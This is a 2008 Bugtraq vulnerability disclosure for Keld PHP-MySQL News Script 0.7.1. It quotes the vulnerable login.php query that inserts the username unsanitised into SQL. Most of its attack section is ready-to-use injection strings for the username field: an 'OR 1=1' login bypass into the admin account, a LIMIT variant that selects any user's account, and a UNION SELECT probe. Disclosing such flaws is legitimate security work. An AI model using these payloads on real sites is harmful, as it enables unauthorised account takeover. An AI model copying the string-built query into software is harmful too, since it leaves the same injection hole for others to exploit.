
Date: Sun, 3 Aug 2008 04:07:30 -0600
From: crimson.loyd@...il.com
To: bugtraq@...urityfocus.com
Subject: Keld: PHP-MySQL News Script 0.7.1 Remote SQL injection Vulnerability

]#;#;#;#;#;#;#;#;#;#;#;#;#;#;#;#;##;#;#;#;#;#;#;#;#;#;#;#;#;#;#;#;##;#;#;#;#;#;#;#;#;#[
]                                                                                     [
]    Name  :  Keld: PHP-MySQL News Script 0.7.1 Remote SQL injection Vulnerability    [
]    Author:  suN8Hclf[crimsoN_Loyd9], DaRk-CodeRs Group                              [
]    Source:  http://sourceforge.net/project/showfiles.php?group_id=26365             [
]    Greetz:  c0ndemned, 0in and other DaRk-CodeRs guys, wizZ                         [
]                                                                                     [
]#;#;#;#;#;#;#;#;#;#;#;#;#;#;#;#;##;#;#;#;#;#;#;#;#;#;#;#;#;#;#;#;##;#;#;#;#;#;#;#;#;#[


Conditions: MAGIC_QUOTES=OFF
Vulnerable Code(login.php):

---------------------------------------CODE (login.php)----------------------------------------------------------------
mysql_select_db($db);
$query = mysql_query("select id,password from users where name = '$username' and password = password('$pass')");
if(mysql_num_rows($query) == 1)
-----------------------------------------------------------------------------------------------------------------------

Exploit:

All strings should be put down into username box in login.php

[1]. Login bypass

    A. admin' OR 1=1/* 
       DESC: This will log us into the admin's account
    B. fdfds' OR 1=1 limit x/*
       where x - from 0 to... i dont know ;)
       DESC: This will log us into the user's account which is x-nd in the table
 
[2]. Classic Remote SQL Injection

      ' AND 1=2 union select 1,2/*
